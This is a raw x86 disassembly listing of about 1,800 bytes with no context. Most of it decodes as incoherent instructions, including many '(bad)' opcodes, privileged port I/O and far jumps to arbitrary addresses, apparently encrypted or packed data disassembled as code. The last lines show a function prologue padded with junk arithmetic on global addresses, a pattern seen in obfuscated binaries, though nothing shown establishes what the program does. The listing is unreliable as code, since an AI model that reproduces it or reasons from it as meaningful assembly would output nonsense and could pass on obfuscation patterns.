  40df85:	jae    0x40dfe5
  40df87:	ret    0x66c4
  40df8a:	mov    esi,DWORD PTR ds:0xe667224
  40df90:	pop    esp
  40df91:	inc    ebx
  40df92:	inc    ebp
  40df93:	inc    ebp
  40df94:	pop    edx
  40df95:	xor    dh,cl
  40df97:	bound  ecx,QWORD PTR [ecx+0x1293d433]
  40df9d:	je     0x40dfe7
  40df9f:	ja     0x40df46
  40dfa1:	ins    DWORD PTR es:[edi],dx
  40dfa2:	pusha  
  40dfa3:	xchg   BYTE PTR [ebx+eax*2-0x5f68bb2f],cl
  40dfaa:	mov    al,ds:0x18edfdd8
  40dfaf:	inc    esi
  40dfb0:	repz into 
  40dfb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfb3:	inc    esi
  40dfb4:	jge    0x40dfd7
  40dfb6:	xor    BYTE PTR ds:0xdf462a2e,0xbf
  40dfbd:	aas    
  40dfbe:	stos   BYTE PTR es:[edi],al
  40dfbf:	in     eax,dx
  40dfc0:	test   bh,al
  40dfc2:	pop    edx
  40dfc3:	jmp    DWORD PTR ds:0xc33aaf0e
  40dfc9:	mov    esi,0xd173fefa
  40dfce:	pop    ebx
  40dfcf:	dec    ebp
  40dfd0:	or     DWORD PTR [eax+0x77],esi
  40dfd3:	cs add esp,0x48d5e6dd
  40dfda:	push   edx
  40dfdb:	jle    0x40dfed
  40dfdd:	aad    0x45
  40dfdf:	pusha  
  40dfe0:	dec    ecx
  40dfe1:	pop    ebp
  40dfe2:	xor    cl,BYTE PTR [esp+ebx*4-0x68c12fc0]
  40dfe9:	add    eax,0xda3f8137
  40dfee:	scas   al,BYTE PTR es:[edi]
  40dfef:	pop    edx
  40dff0:	pop    ecx
  40dff1:	push   0x939d3593
  40dff6:	jl     0x40e036
  40dff8:	lods   eax,DWORD PTR ds:[esi]
  40dff9:	mov    WORD PTR ss:[edx+ebp*1+0xd0594d8],ss
  40e001:	mov    eax,ds:0x7ccfaca4
  40e006:	dec    ecx
  40e007:	inc    esi
  40e008:	xor    BYTE PTR [esi-0x38d3581c],cl
  40e00e:	xchg   edx,eax
  40e00f:	xchg   edx,eax
  40e010:	mov    al,0x3e
  40e012:	mov    bl,0xc1
  40e014:	shl    bh,0xda
  40e017:	stos   BYTE PTR es:[edi],al
  40e018:	ins    BYTE PTR es:[edi],dx
  40e019:	xor    BYTE PTR [ebx+0x21972293],0x39
  40e020:	cdq    
  40e021:	mov    ch,0x7
  40e023:	pop    edi
  40e024:	xor    ebp,ebp
  40e026:	outs   dx,DWORD PTR ds:[esi]
  40e027:	mov    edi,DWORD PTR [edi-0x3d]
  40e02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e02b:	pop    ebp
  40e02c:	aam    0xdd
  40e02e:	add    edx,0x40
  40e031:	outs   dx,DWORD PTR ds:[esi]
  40e032:	sbb    ah,BYTE PTR [esi+0x5f43e89d]
  40e038:	mov    edx,0x96bd0e4d
  40e03d:	bound  edx,QWORD PTR [esp+ebx*4+0x5c]
  40e041:	push   esp
  40e042:	gs ins BYTE PTR es:[edi],dx
  40e044:	leave  
  40e045:	loopne 0x40e0a7
  40e047:	and    al,0x2d
  40e049:	sub    al,0x82
  40e04b:	xchg   esi,eax
  40e04c:	fcmovbe st,st(5)
  40e04e:	xor    DWORD PTR [esi+ebx*4],0x1d
  40e052:	lahf   
  40e053:	pop    ebp
  40e054:	mov    bh,0xdb
  40e056:	inc    eax
  40e057:	lahf   
  40e058:	sub    BYTE PTR ds:0x5b125cb2,ah
  40e05e:	mov    dx,0xb17d
  40e062:	div    BYTE PTR [ebp-0x43b87e85]
  40e068:	in     al,dx
  40e069:	inc    ebx
  40e06a:	mov    ecx,0x15447ea7
  40e06f:	mov    edx,cs
  40e071:	test   edx,ebx
  40e073:	push   cs
  40e074:	xchg   ecx,eax
  40e075:	add    DWORD PTR [esi],ebp
  40e077:	lock iret 
  40e079:	add    esi,ecx
  40e07b:	inc    ebp
  40e07c:	icebp  
  40e07d:	xchg   ebx,eax
  40e07e:	pop    edx
  40e07f:	cs psllq mm6,mm3
  40e083:	fiadd  WORD PTR [edx+0x1f55d703]
  40e089:	cld    
  40e08a:	dec    edi
  40e08b:	push   esi
  40e08c:	inc    eax
  40e08d:	imul   edi,eax,0xffffffb5
  40e090:	add    WORD PTR ds:0x7ee439b0,sp
  40e097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e098:	jbe    0x40e0a8
  40e09a:	push   0x4cd249e4
  40e09f:	loop   0x40e039
  40e0a1:	xacquire xchg DWORD PTR [esi-0x102017d8],ebx
  40e0a8:	mov    esp,0xdb951ff3
  40e0ad:	mov    es,edx
  40e0af:	(bad)  
  40e0b0:	adc    al,0x62
  40e0b2:	mov    ds:0xaffc6ec4,al
  40e0b7:	jge    0x40e03e
  40e0b9:	jmp    0xd839e5ac
  40e0be:	jge    0x40e0cc
  40e0c0:	jnp    0x40e046
  40e0c2:	fcom   DWORD PTR [edx+0x31fb23ce]
  40e0c8:	sub    esi,esi
  40e0ca:	push   ebx
  40e0cb:	jne    0x40e05b
  40e0cd:	jge    0x40e0c8
  40e0cf:	fimul  DWORD PTR [eax]
  40e0d1:	je     0x40e141
  40e0d3:	push   ecx
  40e0d4:	push   edx
  40e0d5:	cmp    al,0xc4
  40e0d7:	xlat   BYTE PTR ds:[ebx]
  40e0d8:	arpl   WORD PTR [edi],bx
  40e0da:	mov    ecx,0xb1307352
  40e0df:	xor    al,0x3e
  40e0e1:	jmp    0x40e147
  40e0e3:	fwait
  40e0e4:	push   0x4d1f1693
  40e0e9:	mov    eax,0x28312545
  40e0ee:	in     eax,0x7d
  40e0f0:	xchg   edi,eax
  40e0f1:	aaa    
  40e0f2:	shl    BYTE PTR [edx+0x2c],cl
  40e0f5:	jmp    0x40e0d8
  40e0f7:	das    
  40e0f8:	loop   0x40e0d3
  40e0fa:	lods   eax,DWORD PTR ds:[esi]
  40e0fb:	leave  
  40e0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0fd:	call   eax
  40e0ff:	fwait
  40e100:	push   0xe2867438
  40e105:	add    ecx,DWORD PTR [edi-0x30ac2701]
  40e10b:	std    
  40e10c:	pop    edi
  40e10d:	pushf  
  40e10e:	xchg   ebx,eax
  40e10f:	push   edx
  40e110:	jmp    0xcc1d779a
  40e115:	sub    al,ch
  40e117:	leave  
  40e118:	mov    al,ds:0xa040928b
  40e11d:	jp     0x40e0c1
  40e11f:	sbb    bh,BYTE PTR [ebp-0x48]
  40e122:	sbb    bh,BYTE PTR [ebx-0x49c91295]
  40e128:	call   0x7f3c:0xd2949e3c
  40e12f:	fcom   QWORD PTR [eax+0x1e]
  40e132:	loope  0x40e198
  40e134:	fisttp DWORD PTR [eax-0x36]
  40e137:	and    dl,BYTE PTR [ebx]
  40e139:	test   BYTE PTR [ecx+eax*2-0x46958be1],ah
  40e140:	fwait
  40e141:	outs   dx,DWORD PTR ds:[esi]
  40e142:	push   cs
  40e143:	dec    edx
  40e144:	dec    cl
  40e146:	add    edx,0x7da0e4e
  40e14c:	pop    esp
  40e14d:	stos   BYTE PTR es:[edi],al
  40e14e:	mov    al,0x44
  40e150:	cmc    
  40e151:	inc    esp
  40e152:	cmp    ch,cl
  40e154:	clc    
  40e155:	mov    ch,0x4d
  40e157:	arpl   WORD PTR ds:0xcddd7a78,bx
  40e15d:	shl    DWORD PTR [esi+0x48dfdde7],1
  40e163:	add    bl,BYTE PTR [edi+0x44]
  40e166:	in     al,0x2a
  40e168:	sahf   
  40e169:	jne    0x40e15c
  40e16b:	adc    BYTE PTR [ebp-0x656a966a],dh
  40e171:	dec    esi
  40e172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e173:	cmp    eax,0x5a0f8ab7
  40e178:	adc    ch,ah
  40e17a:	call   0x69590695
  40e17f:	jmp    0x34ae:0xecdccd7b
  40e186:	into   
  40e187:	jl     0x40e1e7
  40e189:	sub    BYTE PTR [ebx+0x1db33d4c],bl
  40e18f:	push   0xffffffe6
  40e191:	sbb    dl,BYTE PTR ds:0x9ff476a6
  40e197:	dec    ebx
  40e198:	adc    BYTE PTR [eax+0x7ad7d645],0xc4
  40e19f:	dec    edx
  40e1a0:	ret    0x3e8e
  40e1a3:	mov    cl,0x37
  40e1a5:	(bad)  
  40e1a6:	xchg   ebp,eax
  40e1a7:	loope  0x40e138
  40e1a9:	not    BYTE PTR [eax+edx*8]
  40e1ac:	dec    eax
  40e1ad:	rcr    DWORD PTR [edi-0x66],0xfc
  40e1b1:	xchg   ebx,eax
  40e1b2:	sar    DWORD PTR [edi+0x36],cl
  40e1b5:	and    BYTE PTR ds:0xead4fc62,cl
  40e1bb:	cdq    
  40e1bc:	mov    ebx,0x45553df
  40e1c1:	and    DWORD PTR [esi+0x1cb51ed1],ebx
  40e1c7:	(bad)  
  40e1c8:	arpl   WORD PTR [edx-0x6f],cx
  40e1cb:	pop    es
  40e1cc:	dec    edi
  40e1cd:	cwde   
  40e1ce:	loope  0x40e20f
  40e1d0:	std    
  40e1d1:	rol    BYTE PTR [ecx-0x7e091f49],cl
  40e1d7:	cmp    dh,BYTE PTR [edx+eax*1+0x38]
  40e1db:	push   eax
  40e1dc:	les    eax,FWORD PTR [ebx-0x50720995]
  40e1e2:	iret   
  40e1e3:	out    dx,al
  40e1e4:	outs   dx,DWORD PTR ds:[esi]
  40e1e5:	xchg   edi,eax
  40e1e6:	inc    ebx
  40e1e7:	int    0x31
  40e1e9:	sub    ebp,edi
  40e1eb:	mov    ebx,0x73cb8955
  40e1f0:	adc    bl,0x94
  40e1f3:	outs   dx,DWORD PTR ds:[esi]
  40e1f4:	loope  0x40e1f7
  40e1f6:	jmp    0x954fb6d7
  40e1fb:	sub    DWORD PTR [edx],esp
  40e1fd:	gs mov edi,0x5f8a64ce
  40e203:	das    
  40e204:	adc    esi,DWORD PTR [ecx]
  40e206:	and    al,0x30
  40e208:	adc    eax,0xf00b1d57
  40e20d:	mov    ch,0xd2
  40e20f:	push   edx
  40e210:	mov    DWORD PTR [ebx-0x371745a],edx
  40e216:	cld    
  40e217:	lahf   
  40e218:	(bad)  
  40e219:	push   edx
  40e21a:	cld    
  40e21b:	adc    DWORD PTR [esi+ebx*8-0x79],esp
  40e21f:	mov    ch,0x3f
  40e221:	sub    DWORD PTR [edx],eax
  40e223:	inc    ebx
  40e224:	mov    eax,ds:0x1145c12d
  40e229:	inc    esp
  40e22a:	jb     0x40e232
  40e22c:	jmp    0x1e83:0x398a5285
  40e233:	pop    ebx
  40e234:	jmp    0xa5d6:0x844c38eb
  40e23b:	pop    ds
  40e23c:	sbb    eax,edi
  40e23e:	push   ebx
  40e23f:	mov    ds:0xec13ce04,al
  40e244:	sbb    cl,cl
  40e246:	test   edi,eax
  40e248:	xchg   BYTE PTR [ecx+eiz*2],ch
  40e24b:	xlat   BYTE PTR ds:[ebx]
  40e24c:	push   esi
  40e24d:	dec    eax
  40e24e:	dec    esp
  40e24f:	(bad)  
  40e250:	mov    ecx,0x5c94f98
  40e255:	xor    al,0x34
  40e257:	lods   eax,DWORD PTR ds:[esi]
  40e258:	leave  
  40e259:	fidiv  WORD PTR [edi-0x3aa3de9b]
  40e25f:	inc    ecx
  40e260:	push   es
  40e261:	(bad)  
  40e262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e263:	test   eax,0x5cc280ab
  40e268:	add    BYTE PTR [ecx-0x6c],0x6e
  40e26c:	jnp    0x40e2ad
  40e26e:	push   esp
  40e26f:	xlat   BYTE PTR ds:[ebx]
  40e270:	pop    ds
  40e271:	ds mov esp,0x24c10ba6
  40e277:	vpmovzxbq ymm3,xmm4
  40e27c:	pop    ebp
  40e27d:	div    bl
  40e27f:	mov    al,ah
  40e281:	mov    dl,0xe2
  40e283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e284:	mov    eax,ds:0xde86c2a1
  40e289:	add    ebx,DWORD PTR [edx+0x6a]
  40e28c:	mov    DWORD PTR [ebx-0x6b],esi
  40e28f:	mov    ds:0xad736163,al
  40e294:	add    BYTE PTR [eax-0x6e],0x2b
  40e298:	cli    
  40e299:	add    edi,DWORD PTR [ebp-0x10]
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x4a5e5ddc
  40e2c4:	sub    eax,0xaa2eb365
  40e2c9:	jle    0x40e349
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	sbb    al,0x13
  40e2d1:	int    0x80
  40e2d3:	dec    edx
  40e2d4:	dec    ebp
  40e2d5:	xchg   edx,eax
  40e2d6:	fcmovb st,st(3)
  40e2d8:	xchg   esi,eax
  40e2d9:	pop    edx
  40e2da:	mov    bh,0x17
  40e2dc:	(bad)  
  40e2dd:	adc    DWORD PTR [ebx+0x7c],esp
  40e2e0:	sahf   
  40e2e1:	jg     0x40e269
  40e2e3:	jne    0x40e31a
  40e2e5:	sbb    al,0x91
  40e2e7:	addr16 and eax,0x86483a79
  40e2ed:	ror    BYTE PTR [ecx-0x6f],cl
  40e2f0:	mov    dl,0xbf
  40e2f2:	sti    
  40e2f3:	jae    0x40e2b7
  40e2f5:	test   eax,0x1f6cad39
  40e2fa:	jae    0x40e37b
  40e2fc:	rcr    BYTE PTR [ebp-0x2824d1b1],0x7e
  40e303:	ins    DWORD PTR es:[edi],dx
  40e304:	cli    
  40e305:	pop    esi
  40e306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e307:	mov    eax,ds:0xc6c2515d
  40e30c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e30d:	mov    esi,0x38e35373
  40e312:	shl    DWORD PTR [ecx+0x93a3dbe],cl
  40e318:	fdivr  DWORD PTR [eax]
  40e31a:	pop    esi
  40e31b:	jns    0x40e2bf
  40e31d:	xor    al,0xab
  40e31f:	inc    edi
  40e320:	dec    ebp
  40e321:	int    0x26
  40e323:	retf   0x8348
  40e326:	in     eax,0xef
  40e328:	sub    eax,DWORD PTR [esi]
  40e32a:	das    
  40e32b:	ins    DWORD PTR es:[edi],dx
  40e32c:	xor    al,0x9c
  40e32e:	popa   
  40e32f:	in     al,0x73
  40e331:	pop    edx
  40e332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e333:	aam    0xb7
  40e335:	sbb    DWORD PTR [esi-0x2733e6c0],esp
  40e33b:	mov    BYTE PTR [ebp+0x293fc80c],al
  40e341:	fldlg2 
  40e343:	ins    DWORD PTR es:[edi],dx
  40e344:	sub    bh,BYTE PTR [ebx-0x406f7ba6]
  40e34a:	je     0x40e3b1
  40e34c:	lods   eax,DWORD PTR ds:[esi]
  40e34d:	push   eax
  40e34e:	(bad)  
  40e34f:	jmp    0xe3d4f8a7
  40e354:	cmp    eax,0x7145efb3
  40e359:	lods   al,BYTE PTR ds:[esi]
  40e35a:	push   0xffffffb0
  40e35c:	mov    ch,0xf8
  40e35e:	cwde   
  40e35f:	sbb    eax,0x9a0fa48b
  40e364:	adc    BYTE PTR [eax+0x4b],bh
  40e367:	(bad)  
  40e368:	jns    0x40e32d
  40e36a:	aad    0xfa
  40e36c:	inc    esi
  40e36d:	mov    ah,0x94
  40e36f:	mov    edx,0xec92d396
  40e374:	sbb    eax,0x8c256f54
  40e379:	loope  0x40e3bd
  40e37b:	sahf   
  40e37c:	cmp    DWORD PTR [edx-0x29],0xf331e589
  40e383:	pop    edx
  40e384:	cmp    BYTE PTR [ebx+eiz*2-0x46793719],ah
  40e38b:	cld    
  40e38c:	popa   
  40e38d:	gs mov ebp,0x6d4ae955
  40e393:	fcomi  st,st(5)
  40e395:	cwde   
  40e396:	push   cs
  40e397:	jns    0x40e38f
  40e399:	data16 or dh,BYTE PTR gs:[ebx]
  40e39d:	jmp    0xd521:0x6bafc7db
  40e3a4:	and    eax,0x447b9ba9
  40e3a9:	sbb    ebx,edx
  40e3ab:	add    eax,0x407eb47c
  40e3b0:	push   esp
  40e3b1:	sub    dh,ah
  40e3b3:	(bad)  
  40e3b4:	jbe    0x40e3a9
  40e3b6:	and    al,0xe9
  40e3b8:	addr16 lock push es
  40e3bb:	xchg   edi,eax
  40e3bc:	ret    0xceca
  40e3bf:	imul   ebp,DWORD PTR [edi+ebp*8+0x276afcd5],0x54
  40e3c7:	mov    edx,0x363e08e9
  40e3cc:	mov    edi,0xeac015e4
  40e3d1:	push   edx
  40e3d2:	pop    esp
  40e3d3:	enter  0x4694,0x92
  40e3d7:	mov    DWORD PTR [edx-0x15],ebx
  40e3da:	xchg   ecx,eax
  40e3db:	dec    ebx
  40e3dc:	mov    dh,0x7c
  40e3de:	mov    bh,0xad
  40e3e0:	push   ebx
  40e3e1:	jno    0x40e3d3
  40e3e3:	cmc    
  40e3e4:	pop    esi
  40e3e5:	inc    esi
  40e3e6:	cmp    dl,BYTE PTR [ecx]
  40e3e8:	cmp    eax,0x7625b0f2
  40e3ed:	fistp  QWORD PTR [edx]
  40e3ef:	jp     0x40e3c2
  40e3f1:	cmp    eax,0x86db78cd
  40e3f6:	add    eax,0xa223d561
  40e3fb:	rcl    DWORD PTR [edi+0x13],1
  40e3fe:	aad    0xa9
  40e400:	in     eax,0xc7
  40e402:	ins    BYTE PTR es:[edi],dx
  40e403:	std    
  40e404:	ret    0x74ee
  40e407:	loopne 0x40e47f
  40e409:	cld    
  40e40a:	mov    ah,0x2
  40e40c:	xor    ecx,eax
  40e40e:	inc    edx
  40e40f:	das    
  40e410:	fiadd  DWORD PTR [esi-0x10]
  40e413:	out    dx,eax
  40e414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e415:	out    dx,eax
  40e416:	xor    ah,bl
  40e418:	outs   dx,DWORD PTR ds:[esi]
  40e419:	rol    DWORD PTR [bx+si],0xfd
  40e41d:	jae    0x40e3fe
  40e41f:	in     al,dx
  40e420:	xor    DWORD PTR [edx*2+0x1a4e6070],ecx
  40e427:	dec    ebx
  40e428:	jnp    0x40e4a9
  40e42a:	fsub   DWORD PTR [ebx+0x3a1785f1]
  40e430:	fbld   TBYTE PTR [eax-0x19]
  40e433:	test   eax,0x967f9ad5
  40e438:	and    al,0xee
  40e43a:	imul   edx,DWORD PTR [esi],0xffffffc3
  40e43d:	add    eax,0xcca29888
  40e442:	ds add eax,0x8deb6364
  40e448:	sahf   
  40e449:	inc    edx
  40e44a:	aaa    
  40e44b:	loope  0x40e49e
  40e44d:	das    
  40e44e:	mov    eax,ds:0x1d384416
  40e453:	js     0x40e49b
  40e455:	fcmovnu st,st(1)
  40e457:	fistp  WORD PTR [ecx+ebx*2+0x2a5c8317]
  40e45e:	pop    esi
  40e45f:	and    al,0xb9
  40e461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e462:	jg     0x40e3ea
  40e464:	dec    edx
  40e465:	inc    edi
  40e466:	leave  
  40e467:	inc    edi
  40e468:	pop    ecx
  40e469:	fiadd  DWORD PTR [edx+0x18]
  40e46c:	std    
  40e46d:	fnstenv [edi-0x19375810]
  40e473:	add    DWORD PTR [esi+0x64acfde4],ecx
  40e479:	and    al,0xa7
  40e47b:	(bad)  
  40e47c:	mov    dh,0x61
  40e47f:	pop    ebx
  40e480:	xchg   ecx,eax
  40e481:	mov    dh,0x36
  40e483:	fsubr  DWORD PTR [ebx-0x11]
  40e486:	pop    edi
  40e487:	out    dx,eax
  40e488:	leave  
  40e489:	jmp    0xc7d1:0x64de9d5
  40e490:	inc    esp
  40e491:	pushf  
  40e492:	xor    dh,BYTE PTR [edx+ebp*4+0x1e]
  40e496:	adc    al,0x45
  40e498:	jecxz  0x40e4c8
  40e49a:	rcl    DWORD PTR [ebx+eax*1],0xae
  40e49e:	mov    ebp,0xb2602ddb
  40e4a3:	mov    cl,0x64
  40e4a5:	xor    al,0x4c
  40e4a7:	mov    WORD PTR [ebp-0x5d],fs
  40e4aa:	xor    esi,esp
  40e4ac:	fbld   TBYTE PTR [ebx+ebx*8+0x4d6b5831]
  40e4b3:	fdivr  DWORD PTR [ebp-0x1d]
  40e4b6:	and    DWORD PTR [eax+0x2d],0x9
  40e4ba:	dec    edx
  40e4bb:	enter  0xfe8c,0xfd
  40e4bf:	dec    ebx
  40e4c0:	inc    ebx
  40e4c1:	jnp    0x40e460
  40e4c3:	adc    esi,DWORD PTR [ebx+0x611b1fd8]
  40e4c9:	stc    
  40e4ca:	mov    ecx,0xeaa41b21
  40e4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4d0:	jbe    0x40e4c1
  40e4d2:	mov    bl,0xaa
  40e4d4:	aad    0xcd
  40e4d6:	mov    edx,DWORD PTR [ebx]
  40e4d8:	fwait
  40e4d9:	imul   edi,esi,0x262b08b2
  40e4df:	inc    edi
  40e4e0:	adc    eax,0xbaa0e816
  40e4e5:	xor    DWORD PTR [ebx+0x3863316e],0x44
  40e4ec:	sar    DWORD PTR [edx-0x5a3b98e3],cl
  40e4f2:	push   eax
  40e4f3:	add    DWORD PTR [ebx-0x65],edx
  40e4f6:	xchg   ebp,eax
  40e4f7:	mov    bl,0x38
  40e4f9:	sbb    DWORD PTR [eax+0x4f],esi
  40e4fc:	inc    esp
  40e4fd:	sbb    dh,BYTE PTR [edi]
  40e4ff:	jp     0x40e4a9
  40e501:	adc    bh,BYTE PTR ds:0x73eb6a3a
  40e507:	mov    esp,0x564d1b2f
  40e50c:	pop    esp
  40e50d:	imul   edi,DWORD PTR [edx-0x3e],0x23faca0e
  40e514:	xchg   edx,eax
  40e515:	xlat   BYTE PTR ds:[ebx]
  40e516:	popf   
  40e517:	jp     0x40e52c
  40e519:	test   eax,0x37291ad8
  40e51e:	(bad)  
  40e51f:	pop    ss
  40e520:	call   0x9245:0xd3ad9e82
  40e527:	push   ss
  40e528:	iret   
  40e529:	cmp    DWORD PTR [edx],0x50ed54af
  40e52f:	lods   al,BYTE PTR ds:[esi]
  40e530:	pop    edi
  40e531:	outs   dx,DWORD PTR ds:[esi]
  40e532:	jb     0x40e5b3
  40e534:	bound  edx,QWORD PTR [ebp+0x11889e60]
  40e53a:	sbb    eax,0xed8d30e9
  40e53f:	xlat   BYTE PTR ds:[ebx]
  40e540:	test   BYTE PTR [eax],bl
  40e542:	mov    bh,0x64
  40e544:	ror    BYTE PTR [edx+ebx*4+0x67],1
  40e548:	adc    dh,BYTE PTR [edi]
  40e54a:	test   DWORD PTR [eax],esp
  40e54c:	push   edx
  40e54d:	cmp    al,0x15
  40e54f:	into   
  40e550:	sbb    eax,0x97d34a8f
  40e555:	outs   dx,BYTE PTR ds:[esi]
  40e556:	mov    al,ds:0xc3e08186
  40e55b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e55c:	pop    ss
  40e55d:	(bad)  
  40e55e:	cli    
  40e55f:	mov    ebx,0x9e16db7
  40e564:	mov    ds:0x3d13159d,al
  40e569:	aad    0xe1
  40e56b:	stos   BYTE PTR es:[edi],al
  40e56c:	mov    bh,0x92
  40e56e:	mov    ebp,0x26c8c096
  40e573:	fcmovu st,st(4)
  40e575:	out    0x7f,eax
  40e577:	mov    al,ds:0x3a9b7664
  40e57c:	in     al,dx
  40e57d:	mov    bh,0x34
  40e57f:	or     eax,0x79ce1c93
  40e584:	pop    esi
  40e585:	jbe    0x40e556
  40e587:	frstor [edi-0x18]
  40e58a:	mov    ebx,DWORD PTR [ebp+eax*1-0x54]
  40e58e:	jns    0x40e5c5
  40e590:	out    dx,al
  40e591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e592:	shl    BYTE PTR [ecx],1
  40e594:	in     eax,dx
  40e595:	iret   
  40e596:	mov    al,ds:0xa91d0fbc
  40e59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e59c:	or     edx,eax
  40e59e:	jb     0x40e5cd
  40e5a0:	lds    ebp,FWORD PTR [ebx+edi*1+0x37]
  40e5a4:	add    ebx,ebp
  40e5a6:	add    DWORD PTR [ebp+0x42],ecx
  40e5a9:	dec    edx
  40e5aa:	loope  0x40e627
  40e5ac:	call   0xc82e:0x3c7429f2
  40e5b3:	dec    ebp
  40e5b4:	pushf  
  40e5b5:	hlt    
  40e5b6:	in     eax,dx
  40e5b7:	or     BYTE PTR [ebp-0x37],dh
  40e5ba:	cmp    ah,BYTE PTR [esi-0x31]
  40e5bd:	cmc    
  40e5be:	cmp    eax,0xcbdd35ca
  40e5c3:	add    edi,DWORD PTR [esi+edx*8-0x3af0e34a]
  40e5ca:	lods   al,BYTE PTR ds:[esi]
  40e5cb:	int    0xa3
  40e5cd:	bound  esi,QWORD PTR [edi+esi*1]
  40e5d0:	xchg   esi,edi
  40e5d2:	fdiv   st,st(5)
  40e5d4:	or     DWORD PTR [esi],0xffffff9a
  40e5d7:	dec    ebp
  40e5d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5d9:	retf   
  40e5da:	gs fwait
  40e5dc:	test   al,0xe4
  40e5de:	fcmovnb st,st(1)
  40e5e0:	ror    esi,0x7d
  40e5e3:	xchg   ch,bh
  40e5e5:	sub    BYTE PTR [eax-0x74],bh
  40e5e8:	mov    bh,0xea
  40e5ea:	adc    eax,0x2dccbdf4
  40e5ef:	imul   edx,DWORD PTR [edx-0x53],0x213a17f7
  40e5f6:	mov    ecx,0x95d5e8a8
  40e5fb:	hlt    
  40e5fc:	es fdivr st(6),st
  40e5ff:	and    edx,esi
  40e601:	cmp    eax,0xa7259a0e
  40e606:	rcl    bl,1
  40e608:	sbb    al,0x11
  40e60a:	call   0x6046d289
  40e60f:	mov    DWORD PTR [ecx],esp
  40e611:	loopne 0x40e624
  40e613:	aas    
  40e614:	mov    dh,0x16
  40e616:	rcr    DWORD PTR [ebx+0x44],cl
  40e619:	or     dl,BYTE PTR [eax-0x17f434ef]
  40e61f:	sti    
  40e620:	jmp    0x40e656
  40e622:	lds    esi,FWORD PTR [ebp-0x65]
  40e625:	or     BYTE PTR [esi],ah
  40e627:	push   ebx
  40e628:	ins    BYTE PTR es:[edi],dx
  40e629:	sar    BYTE PTR [esi+eiz*4-0x74],1
  40e62d:	aas    
  40e62e:	(bad)  
  40e62f:	cmp    edi,DWORD PTR [eax]
  40e631:	or     cl,ah
  40e633:	nop
  40e634:	in     al,dx
  40e635:	pop    edi
  40e636:	clc    
  40e637:	xlat   BYTE PTR ds:[ebx]
  40e638:	xor    eax,0xb894a633
  40e63d:	out    0x7d,eax
  40e63f:	cdq    
  40e640:	gs jle 0x40e626
  40e643:	lds    esi,FWORD PTR [edi]
  40e645:	daa    
  40e646:	add    BYTE PTR [ecx+edi*1+0x8],dh
  40e64a:	fs ins DWORD PTR es:[edi],dx
  40e64c:	or     al,al
  40e64e:	popa   
  40e64f:	fwait
  40e650:	mov    cl,0xd8
  40e652:	test   BYTE PTR [edx-0x6e],dl
  40e655:	das    
  40e656:	mov    BYTE PTR [ebx+0x7fe5416],al
  40e65c:	jb     0x40e6bd
  40e65e:	sub    edi,eax
  40e660:	imul   ebp
  40e662:	push   DWORD PTR [ecx-0x70]
  40e665:	dec    eax
  40e666:	push   edi
  40e667:	xchg   edi,eax
  40e668:	or     DWORD PTR [esi+eiz*2+0x762df6d0],edi
  40e66f:	sbb    BYTE PTR [edx-0x59],al
  40e672:	inc    esi
  40e673:	and    esi,esi
  40e675:	in     eax,0xbc
  40e677:	out    dx,al
  40e678:	add    al,0x3
  40e67a:	dec    sp
  40e67c:	rol    BYTE PTR ds:0x70da6008,1
  40e682:	or     eax,0x5cc994ba
  40e687:	dec    edx
  40e688:	jb     0x40e6e0
  40e68a:	shl    DWORD PTR [eax+0x78e35892],cl
  40e690:	std    
  40e691:	cmp    al,0xc5
  40e693:	mov    WORD PTR [ebx-0x1726e99e],ss
  40e699:	int    0xfc
  40e69b:	and    dh,BYTE PTR [edi+0x29]
  40e69e:	lods   al,BYTE PTR ds:[esi]
  40e69f:	inc    esp
  40e6a0:	xchg   edx,eax
  40e6a1:	xor    esi,DWORD PTR [ebx+0x65ed6634]
  40e6a7:	dec    eax
  40e6a8:	mov    al,0xbe
  40e6aa:	pop    es
  40e6ab:	out    dx,al
  40e6ac:	dec    esp
  40e6ad:	dec    eax
  40e6ae:	push   eax
  40e6af:	cmc    
  40e6b0:	fsub   QWORD PTR [ecx+0x48b6b1bc]
  40e6b6:	rcr    DWORD PTR [edi+0x75],cl
  40e6b9:	call   0x4b235e16
  40e6be:	cmp    DWORD PTR [ebx+0x64],0xc593e6be
  40e6c5:	push   esi
  40e6c6:	js     0x40e6e0
  40e6c8:	pop    di
  40e6ca:	leave  
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434593,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x434543,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x4344c7
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x4344bb,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434483,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
